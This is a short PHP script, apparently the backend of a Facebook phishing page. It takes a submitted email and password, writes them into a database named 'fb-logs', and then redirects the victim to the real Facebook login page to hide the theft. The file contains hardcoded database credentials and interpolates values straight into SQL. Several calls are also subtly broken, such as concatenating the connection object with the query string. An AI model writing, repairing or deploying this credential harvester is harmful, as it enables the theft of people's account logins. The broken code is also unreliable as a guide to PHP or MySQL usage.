<?php
if (!empty($_POST['email']) && !empty($_POST['pass'])) {
    $user = filter_var($_POST['email'], FILTER_SANITIZE_EMAIL, MYSQLI_NOT_NULL_FLAG);
    $pass = filter_var($_POST['pass'], FILTER_SANITIZE_SPECIAL_CHARS, MYSQLI_NOT_NULL_FLAG);
}

$link_db = mysqli_connect('localhost', 'fb-logs', '23047878A', 'fb-logs');

$query = "INSERT INTO users_log SET user_log='$user',pass_log='$pass'";

$insert_db = $link_db . $query;

mysqli_query($insert_db);

return header('Location: https://facebook.com/login') . exit();
